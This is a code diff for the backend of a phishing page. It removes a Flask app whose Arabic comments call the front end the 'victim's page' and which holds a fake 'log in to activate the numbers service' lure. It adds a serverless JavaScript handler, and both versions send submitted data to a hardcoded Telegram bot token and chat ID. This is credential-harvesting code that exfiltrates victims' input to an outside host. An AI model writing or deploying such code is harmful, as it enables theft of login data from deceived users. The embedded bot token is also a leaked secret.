@@ -1,40 +1,26 @@
-from flask import Flask, request, jsonify
-import requests
+export default async function handler(req, res) {
+    if (req.method === 'POST') {
+        const { message } = req.body;
+        
+        const BOT_TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ";
+        const CHAT_ID = "7984067238";
 
-app = Flask(__name__)
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-# 1. ضع التوكن الحقيقي هنا (الأرقام والرموز فقط)
-TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
-# 2. ضع الأيدي الخاص بك هنا
-CHAT_ID = "7984067238"
-
-# تخزين الإعدادات لتعرضها صفحة الضحية
-latest_config = {
-    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
-    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
-    "button": "تفعيل الآن"
+        try {
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message, // النص المنسق القادم من الواجهة
+                    parse_mode: "Markdown" // لتفعيل الخط العريض والرموز
+                })
+            });
+            return res.status(200).json({ success: true });
+        } catch (error) {
+            return res.status(500).json({ error: error.message });
+        }
+    }
+    res.status(405).json({ message: 'Method not allowed' });
 }
-
-@app.route('/api/save', methods=['POST'])
-def save_data():
-    global latest_config
-    try:
-        data = request.json
-        # إذا كانت البيانات لتحديث اللوحة
-        if 'image' in data and 'letter' in data and 'button' in data:
-            latest_config = data
-        
-        # إرسال البيانات للبوت
-        msg = f"🚀 **بيانات جديدة:**\n\n{data}"
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
-        
-        return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/api/get', methods=['GET'])
-def get_config():
-    return jsonify(latest_config)
-
-def handler(environ, start_response):
-    return app(environ, start_response)
